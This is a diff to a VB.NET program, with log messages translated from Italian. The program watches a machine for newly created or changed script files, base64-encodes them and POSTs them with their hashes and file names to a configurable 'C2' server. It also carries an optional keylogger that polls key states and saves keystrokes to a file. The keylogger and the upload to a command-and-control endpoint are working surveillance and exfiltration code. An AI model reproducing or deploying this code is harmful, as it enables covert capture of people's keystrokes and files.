@@ -6,10 +6,11 @@ Imports System.Threading
 Imports System.Security.Cryptography
 Imports System.Net
 Imports System.Text
+'Imports System.Runtime.InteropServices
 
 Module Module1
 
-    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short   '<----- api for keylogger / testare SetWindowsHookExA
+    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Short
     Public c As New Configurazione
     Public arrayEst As String()
 
@@ -80,11 +81,16 @@ Module Module1
                 c.keylogger = False
             End If
 
+            s = f.ReadLine()
+            s = f.ReadLine()
+            c.log_name = s
+
             f.Close()
 
         Else
             c.path_monitor = "c:\"
             arrayEst(0) = ".ps1"
+
             c.path_escl_monitoring = "c:\windows\"
             c.temp_path = "c:\temp\"
             c.switch_monitor_path = False
@@ -92,6 +98,7 @@ Module Module1
             c.switch_del_error = False
             c.url_c2 = "#"
             c.keylogger = False
+            c.log_name = "C2 Control"
         End If
     End Sub
 
@@ -108,26 +115,27 @@ Module Module1
     End Function
 
     Private Sub onException(sender As Object, e As Runtime.ExceptionServices.FirstChanceExceptionEventArgs)
-        log_locale("[+] Eccezione: " & e.Exception.Message.ToString)
+        log_locale("[+] Exception: " & e.Exception.Message.ToString)
     End Sub
     Private Sub gestError(sender As Object, e As ErrorEventArgs)
-        log_locale("[+] Eccezione: " & e.GetException.Message.ToString)
+        log_locale("[+] Exception: " & e.GetException.Message.ToString)
     End Sub
+
+
 
     Sub Main()
 
         Try
-            log_locale("[+] Avvio...")
+            log_locale("[+] Start...")
             carica_configurazione()
-            log_locale("[+] Configurazione caricata")
+            log_locale("[+] Configuration loaded")
         Catch
-            log_locale("[+] Errore nel caricamento file di configurazione")
+            log_locale("[+] Error loading configuration file")
             End
         End Try
 
         clean_temp()
-        If c.keylogger Then avvia_keylogger() '<--------------------
-
+        If c.keylogger Then avvia_keylogger()
 
         AddHandler AppDomain.CurrentDomain.ProcessExit, AddressOf OnClose
         AddHandler AppDomain.CurrentDomain.FirstChanceException, AddressOf onException
@@ -142,9 +150,9 @@ Module Module1
 
         Dim isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator)
         If isAdmin Then
-            log_locale("[+] L'utente corrente ha i permessi di amministratore.")
+            log_locale("[+] The current user has administrator permissions")
         Else
-            log_locale("[+] L'utente corrente non ha i permessi di amministratore.")
+            log_locale("[+] The current user does not have administrator permissions")
             End
         End If
 
@@ -162,11 +170,13 @@ Module Module1
         AddHandler w.Error, AddressOf gestError
 
 
+
+
+        ' start monitoring
         w.EnableRaisingEvents = True
 
-        'modificare quando da console a service
         '************************************************************************************
-        Console.WriteLine("[+] In attesa di creazione di file...")
+        Console.WriteLine("[+] Waiting for file creation...")
         Console.ReadLine()
         '************************************************************************************
 
@@ -184,7 +194,7 @@ Module Module1
         Catch ex As Exception
 
         End Try
-        log_locale("[+] Path temp svuotato")
+        log_locale("[+] Path temp cleaned")
     End Sub
 
     Private Sub onRenamed(sender As Object, e As RenamedEventArgs)
@@ -195,13 +205,13 @@ Module Module1
 
             If c.switch_monitor_path Then
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                 Else
                     salva_file(e.FullPath, 1)
                 End If
             Else
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                 Else
                     salva_file(e.FullPath, 1)
                 End If
@@ -217,13 +227,13 @@ Module Module1
         If verifica_ext(ext.Extension) Then
             If c.switch_monitor_path Then
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                 Else
                     salva_file(e.FullPath, 2)
                 End If
             Else
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                 Else
                     salva_file(e.FullPath, 2)
                 End If
@@ -239,13 +249,13 @@ Module Module1
 
             If c.switch_monitor_path Then
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                 Else
                     salva_file(e.FullPath, 3)
                 End If
             Else
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                 Else
                     salva_file(e.FullPath, 3)
                 End If
@@ -262,19 +272,19 @@ Module Module1
 
             If c.switch_monitor_path Then
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Or InStr(UCase(e.FullPath), UCase(c.temp_path)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                     '
                 Else
-                    log_locale("[+] File cancellato: " & e.FullPath)
-                    scrivi_evento("File: " & e.FullPath, 469) 'cancella
+                    log_locale("[+] File deleted: " & e.FullPath)
+                    scrivi_evento("File: " & e.FullPath, 469)
                 End If
             Else
                 If InStr(UCase(e.FullPath), UCase(c.path_escl_monitoring)) > 0 Then
-                    log_locale("[+] Escluso file: " & e.FullPath)
+                    log_locale("[+] Excluding files: " & e.FullPath)
                     '
                 Else
-                    log_locale("[+] File cancellato: " & e.FullPath)
-                    scrivi_evento("File: " & e.FullPath, 469) 'cancella
+                    log_locale("[+] File deleted: " & e.FullPath)
+                    scrivi_evento("File: " & e.FullPath, 469)
                 End If
             End If
 
@@ -305,17 +315,18 @@ Module Module1
                 Select Case id
                     Case 1
                         scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 269)
-                        invia_to_c2("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 269)
+                        invia_to_c2(base64text, 269, md5hash, f)
                     Case 2
                         scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 169)
-                        invia_to_c2("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 169)
+                        invia_to_c2(base64text, 169, md5hash, f)
                     Case 3
                         scrivi_evento("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 369)
-                        invia_to_c2("File: " & f & vbCrLf & "MD5: " & md5hash & vbCrLf & "Code: " & base64text, 369)
+                        invia_to_c2(base64text, 369, md5hash, f)
                 End Select
             End Try
 
             elimina_file(c.temp_path & nome_file)
+
 
         End If
 
@@ -377,7 +388,7 @@ Module Module1
             If c.switch_del_error Then
                 File.Delete(verifica_path(Directory.GetCurrentDirectory) & "error.log")
             Else
-                log_locale("[+] Chiusura")
+                log_locale("[+] Stopping")
             End If
         Catch ex As Exception
 
@@ -387,22 +398,21 @@ Module Module1
     Sub scrivi_evento(messaggio As String, idlog As Integer)
 
         If Len(messaggio) > 0 Then
-            Dim sourceName As String = "PayloadControl"
-            Dim logName As String = "LogPC"
+            Dim sourceName As String = c.log_name
+            Dim logName As String = "LogC2"
             Try
-
                 If Not EventLog.SourceExists(sourceName) Then
                     EventLog.CreateEventSource(sourceName, logName)
-                    log_locale("[+] Log source PayloadControl creata...")
+                    log_locale("[+] Log source created...")
                 Else
-                    log_locale("[+] Log source PayloadControl aggiornato...")
+                    log_locale("[+] Log source updated...")
                 End If
 
                 Dim log As New EventLog()
                 log.Source = sourceName
                 log.WriteEntry(messaggio, EventLogEntryType.Information, idlog)
             Catch
-                log_locale("[+] Impossibile gestire eventi...")
+                log_locale("[+] Unable to handle events...")
             End Try
         End If
 
@@ -418,12 +428,16 @@ Module Module1
     End Function
 
 
-    Sub invia_to_c2(b As String, i As String)
+    Sub invia_to_c2(b As String, i As String, h As String, f As String)
+        'b as base64
+        'i as id log
+        'h as hash
+        'f as file name
         If Not Mid(c.url_c2, 1, 1) = "#" Then
 
             Try
                 Dim request As WebRequest = WebRequest.Create(c.url_c2)
-                Dim postData As String = "idlog=" & i & "&payload=" & b
+                Dim postData As String = "id_log=" & i & "&b64=" & b & "&hash=" & h & "&file_name=" & WebUtility.HtmlEncode(f.Replace("\", "\\"))
                 Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
 
                 request.Method = "POST"
@@ -439,12 +453,12 @@ Module Module1
                     Dim reader As New StreamReader(inStream)
                     Dim responseFromServer As String = reader.ReadToEnd()
 
-                    log_locale("[+] Dati inviati al C2: " & responseFromServer)
+                    log_locale("[+] Data sent to C2: " & responseFromServer)
                 End Using
                 response.Close()
 
             Catch ex As Exception
-                log_locale("[+] Errore invio al C2")
+                log_locale("[+] Error sending to C2")
             End Try
 
         End If
@@ -460,9 +474,10 @@ Module Module1
         td = New Thread(AddressOf keylogger)
         td.Start()
         'td.Join()
+
     End Sub
     Sub keylogger()
-        'testing *******
+
         While True
             For i = 65 To 128
                 If GetAsyncKeyState(i) = -32767 Then
@@ -474,7 +489,6 @@ Module Module1
     End Sub
 
     Sub keylogger_scrivi(b As String)
-        'to do -> send to c2
         Dim f As New StreamWriter("./keylog.txt", append:=True)
         f.Write(b)
         f.Close()
@@ -483,3 +497,4 @@ Module Module1
 
     '------------------------------------------------------------------------------------------
 End Module
+
